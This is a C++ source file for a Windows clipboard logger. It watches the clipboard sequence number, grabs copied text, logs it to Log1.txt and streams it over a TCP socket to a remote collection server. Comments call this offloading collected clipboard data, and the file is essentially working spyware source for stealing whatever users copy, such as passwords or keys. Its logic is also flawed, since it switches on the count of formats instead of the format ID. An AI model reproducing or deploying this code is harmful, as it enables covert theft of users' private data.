//These defines are needed to prevent winsock2 from calling window.h twice.
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <conio.h>
//Libraries below are needed for transmitting files to remote server.
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")


using namespace std;
//create a stream to a file stored in the Logbook object
string Logbook = "Log1.txt";
ofstream Recorder(Logbook);

// used for socket object



int main() {
	// This code is to connect to the remote server, to offload the data collected from the clipboard.
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "Wsastartup Failed.";
		return 1;
		}


	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	#define DEFAULT_PORT "65432"
	
	// Resolve the server address and port
	iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}


	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// Should really try the next address returned by getaddrinfo
	// if the connect call failed
	// But for this simple example we just free the resources
	// returned by getaddrinfo and print an error message

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}
	#define DEFAULT_BUFLEN 1024

	//This is a format example on how to send data to the server. To be deleted for release.
	char* sendbuf = (char *)"this is a test";
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		cout << "Send failed"<< endl;
		closesocket(ConnectSocket);
		WSACleanup();
	}

	DWORD tOurSeq = -1;//our current count
	while (1) {//continuously run

		
		// get the clipboard count, used to validate if the clipboard has been updated. https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber
		DWORD ClipSeq = GetClipboardSequenceNumber();
		//see if the clipboard and our count are the same to till if it change since our last count
		bool same = (ClipSeq == tOurSeq);
		//set our count to the clipboard count
		tOurSeq = ClipSeq;
		

		try {
			//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamea#return-value
			// Gathers the number of formats currently on clipboard https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-countclipboardformats
			UINT formats = CountClipboardFormats();
			UINT next_format = 0;
			next_format = EnumClipboardFormats(next_format);
			const int max_count = 4096;
			wchar_t format_name[max_count];
			int name_length = GetClipboardFormatName(next_format, format_name, max_count);
			int format = (int)formats;
			//flags to check the clipboard format.
			bool UNICODETEXT = IsClipboardFormatAvailable(CF_UNICODETEXT);
			bool Text = IsClipboardFormatAvailable(CF_TEXT);
			bool TIFF = IsClipboardFormatAvailable(CF_TIFF);
			HANDLE in;
			if (!same) {
				std::cout << "==========================================================================================================================" << endl;
				std::cout << "Format " << format << " " << endl;
				Recorder << "==========================================================================================================================" << endl;
				Recorder << "Format " << format << " " << endl;

				switch (format) {
					//Data type: ANSI text
					//Use Case:text
					//CF_TEXT
				case 1:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					sendbuf = (char*)in;
					send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);

					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					CloseClipboard();
					break;
					//Data type:HBITMAP
					//Use Case:Handler to a bitmap (GDI Object)
					//CF_BITMAP
				case 2:

					break;
					//Data type: METAFILEPICT
					//Use Case: Windows-Format Metafiles picture
					//CF_MetafilePict
				case 3:
					break;
					//Data type:ANSI Text
					//Use Case:Microsoft Symbolic Link
					//Cf_Sylk
				case 4:
					break;
					//Data type:ASCII Text
					//Use Case:Software Arts Data Interchange Format 
					//CF_Dif
				case 5:
					break;
					//Data type:TIFF
					//Use Case:TIFF image
					//CF_TiFF
				case 6:
					break;
					//Data type:8-bit DOS text
					//Use Case:Text
					//CF_OEMTEXT
				case 7:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					sendbuf = (char*)in;
					send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					//This does not contain error case code, so if there is an error it will still log.
					//We should add an if, incase the socket is busted.

					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					CloseClipboard();
					break;
					//Data type:BITMAPINFO
					//Use Case:Structure followed by bitmap bits
					//CF_DIB
				case 8:
					break;
					//Data type:HPALETTE
					//Use Case:Handle to a Color palette
					//CF_Palette
				case 9:
					break;
					//Data type:
					//Use Case:Windows 3.1 pen extension data
					//CF_PenDATA
				case 10:
					break;
					//Data type:RIFF
					//Use Case:Resource Interchange File Format (RIFF) audio
					//CF_RIFF
				case 11:
					break;
					//Data type:WAVE
					//Use Case:WAVE audio
					//CF_WAVE
				case 12:
					break;
					//Data type:Unicode text
					//Use Case:Text
					//CF_UNICODETEXT
				case 13:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					CloseClipboard();
					break;
					//Data type:HENHMETAFILE
					//Use Case:Enhanced-Format Metafiles handle
					//CF_EMHMETAFILE
				case 14:
					break;
					//Data type:DROPFILES
					//Use Case:List of file names
					//CF_HDROP
				case 15:
					break;
					//Data type:DWORD(LCID) LCID for CF_TEXT to CF_UNICODE
					//Use Case:LCID for CF_TEXT to CF_UNICODE conversion
					//CF_LOCALE
				case 16:
					break;
					//Data type:BITMAPV5HEADER
					//Use Case:Structure followed by bitmap bits
					//CF_DIBV5
				case 17:
					break;
					//Data type:TEXT
					//Use Case:ANSI text
					//CF_DSPTEXT
				case 0x0081:
					break;
					//Data type:HBITMAP
					//Use Case:Structure followed by bitmap bits
					//CF_DSPBITMAP
				case 0x0082:
					break;
					//Data type:METAFILEPICT
					//Use Case:Windows-Format Metafiles picture
					//CF_DSPENHMETAFILE
				case 0x008E:
					break;
					//Data type:HENHMETAFILE
					//Use Case:	Enhanced-Format Metafiles handle
					//CF_DSPMETAFILEPICT
				case 0x0083:
					break;
					//Data type:
					//Use Case:
					//CF_GDIOBJFIRST
				case 0x0300:
					break;
					//Data type:
					//Use Case:
					//CF_GDIOBJLAST
				case 0x03FF:
					break;
					//Data type:
					//Use Case:
					//CF_OWNERDISPLAY
				case 0x0080:
					break;
					//Data type:
					//Use Case:
					//CF_PRIVATEFIRST
				case 0x0200:
					break;
					//Data type:
					//Use Case:
					//CF_PRIVATELAST
				case 0x02FF:
					break;


				default:
					break;
				}

			}
		}

		catch (exception e) {
			cout << "this is not text" << endl;

		}
	}
	Recorder.close();
	closesocket(ConnectSocket);
	WSACleanup();
 }